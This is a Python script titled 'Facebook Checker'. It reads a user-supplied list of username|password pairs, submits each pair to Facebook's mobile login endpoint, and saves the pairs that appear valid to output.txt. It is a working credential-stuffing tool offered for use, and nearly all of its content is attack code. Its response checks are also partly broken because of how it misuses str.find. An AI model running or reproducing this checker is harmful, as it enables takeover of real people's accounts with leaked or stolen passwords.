import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

color = random.choice([F.GREEN, F.RED, F.BLUE, F.YELLOW, F.CYAN, F.MAGENTA])
lists = input("Enter the file name which contains username|password list: ")
sep = input("Enter the seperator used to seperate username and password: ")
os.system('clear||cls')
print(color + """
	

___________                      ___.                     __     _________  .__                     __                      
\_   _____/_____     ____   ____ \_ |__    ____    ____  |  | __ \_   ___ \ |  |__    ____   ____  |  | __  ____ _______    
 |    __)  \__  \  _/ ___\_/ __ \ | __ \  /  _ \  /  _ \ |  |/ / /    \  \/ |  |  \ _/ __ \_/ ___\ |  |/ /_/ __ \\_  __ \   
 |     \    / __ \_\  \___\  ___/ | \_\ \(  <_> )(  <_> )|    <  \     \____|   Y  \\  ___/\  \___ |    < \  ___/ |  | \/   
 \___  /   (____  / \___  >\___  >|___  / \____/  \____/ |__|_ \  \______  /|___|  / \___  >\___  >|__|_ \ \___  >|__|      
     \/         \/      \/     \/     \/                      \/         \/      \/      \/     \/      \/     \/           
_________              .___           .___ __________                                                                       
\_   ___ \   ____    __| _/ ____    __| _/ \______   \ ___.__. /\                                                           
/    \  \/  /  _ \  / __ |_/ __ \  / __ |   |    |  _/<   |  | \/                                                           
\     \____(  <_> )/ /_/ |\  ___/ / /_/ |   |    |   \ \___  | /\                                                           
 \______  / \____/ \____ | \___  >\____ |   |______  / / ____| \/                                                           
        \/              \/     \/      \/          \/  \/                                                                   
 ____  __.        .__         .__                      _________  .__             .__   __                                  
|    |/ _|_______ |__|  ______|  |__    ____  _____    \_   ___ \ |  |__  _____   |__|_/  |_ _____     ____  ___.__._____   
|      <  \_  __ \|  | /  ___/|  |  \  /    \ \__  \   /    \  \/ |  |  \ \__  \  |  |\   __\\__  \   /    \<   |  |\__  \  
|    |  \  |  | \/|  | \___ \ |   Y  \|   |  \ / __ \_ \     \____|   Y  \ / __ \_|  | |  |   / __ \_|   |  \\___  | / __ \_
|____|__ \ |__|   |__|/____  >|___|  /|___|  /(____  /  \______  /|___|  /(____  /|__| |__|  (____  /|___|  // ____|(____  /
        \/                 \/      \/      \/      \/          \/      \/      \/                 \/      \/ \/          \/ 


	""")

lists= open(lists, 'r').readlines()
lists = [line.replace('\n',"") for line in lists]
for line in lists:
	data = line.split(sep)
	url = 'https://m.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
	payload = {'email': data[0], 'pass': data[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Facebook ಗೆ ಲಾಗಿನ್ ಮಾಡಿ | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(data[0],data[1] + " [+]"))
		print("-- Live accounts --\n" + data[0] + "|" + data[1], file=open("output.txt", "a+"))

	elif r.find('You used an old password. If you have forgotten your password you can request'):
		print(F.YELLOW + '[!] Old password [!]')

	elif r.find('You Changed your password more than '):
		print(F.YELLOW + '[!] Old Password [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(data[0],data[1] + " [-]"))

